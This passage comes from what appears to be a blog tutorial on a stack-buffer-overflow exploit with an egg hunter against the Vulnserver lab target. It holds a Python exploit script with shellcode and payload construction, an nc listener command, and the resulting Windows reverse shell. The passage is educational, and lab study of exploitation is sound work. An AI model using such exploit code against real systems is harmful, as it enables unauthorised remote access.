"\x97\xb0\x81\x74\xbf\xc3\xf2\x46\x60\x78\x9c\xea\xe9\xa6\x5b"
"\x0c\xc0\x1f\xf3\xf3\xeb\x5f\xda\x37\xbf\x0f\x74\x91\xc0\xdb"
"\x84\x1e\x15\x4b\xd4\xb0\xc6\x2c\x84\x70\xb7\xc4\xce\x7e\xe8"
"\xf5\xf1\x54\x81\x9c\x08\x3f\x02\x70\x25\xfa\x32\x73\x49\x05"
"\x78\xfa\xaf\x6f\x6e\xab\x78\x18\x17\xf6\xf2\xb9\xd8\x2c\x7f"
"\xf9\x53\xc3\x80\xb4\x93\xae\x92\x21\x54\xe5\xc8\xe4\x6b\xd3"
"\x64\x6a\xf9\xb8\x74\xe5\xe2\x16\x23\xa2\xd5\x6e\xa1\x5e\x4f"
"\xd9\xd7\xa2\x09\x22\x53\x79\xea\xad\x5a\x0c\x56\x8a\x4c\xc8"
"\x57\x96\x38\x84\x01\x40\x96\x62\xf8\x22\x40\x3d\x57\xed\x04"
"\xb8\x9b\x2e\x52\xc5\xf1\xd8\xba\x74\xac\x9c\xc5\xb9\x38\x29"
"\xbe\xa7\xd8\xd6\x15\x6c\xf8\x34\xbf\x99\x91\xe0\x2a\x20\xfc"
"\x12\x81\x67\xf9\x90\x23\x18\xfe\x89\x46\x1d\xba\x0d\xbb\x6f"
"\xd3\xfb\xbb\xdc\xd4\x29")

pwn = "w00tw00t"
pwn+= shellcode
pwn+= "A" * (3457-len(pwn))
pwn+= egghunter
pwn+= "\x90\x90\x90\x90\x90\x90"
pwn+= "\xeb\xd8\x90\x90"
pwn+= "\xb3\x11\x50\x62"
pwn+= "D" * (5000-len(pwn))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
Remember when we spoke about egg hunters earlier? A few things were mentioned. 1- The egg hunter looks for two occurrences of its tag in order to validate that the opcode directly after the tags should be executed. 2 - We have `w00tw00t` appended to the beginning our second stage shellcode. Everything else stays the same- and we are ready to fire off our exploit! 

Before we do anything this time, on our attacking machine, we need to start a `nc` listener to catch our shell when it is sent. Here is how we start our listener:
```console
root@kali:~/Desktop# nc -nlvp 443
listening on [any] 443 ...
```
We close out of the debugger, and we drop kick our exploit like freaking Tim Howard at the Vulnserver. That egg hunter works hard for us, and BOOM! We are in there like swimwear!!!!! We have obtained a shell:

```console
root@kali:~/Desktop# nc -nlvp 443
listening on [any] 443 ...
connect to [172.16.55.69] from (UNKNOWN) [172.16.55.134] 1239
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop\vulnserver-master\vulnserver-master>
```

Mouth Of The River
---
There is an ocean of resources out there about exploit development. The above post was just to shed some light on buiding on the fundementals of a simple vanilla stack based buffer overflow. There are copious amounts of blogs on simple overflows, but the more low level you go- the less there is (and the move convoluted the writeups get). I will probably be documenting more exploit development topics as I go forward. 

I just wanted to share information with others today in a way that I think is easy to understand. I remember the exact chronological order I had to endure to in order to understand things like why a `pop pop ret` chain is needed with exception handler exploitation. I hope by sharing what I have learned in my own words, I can relay those phrases or analogies that led me to have my "AHA!" moments, with all of you! Peace, love, and positivity! Have a great day :-) 
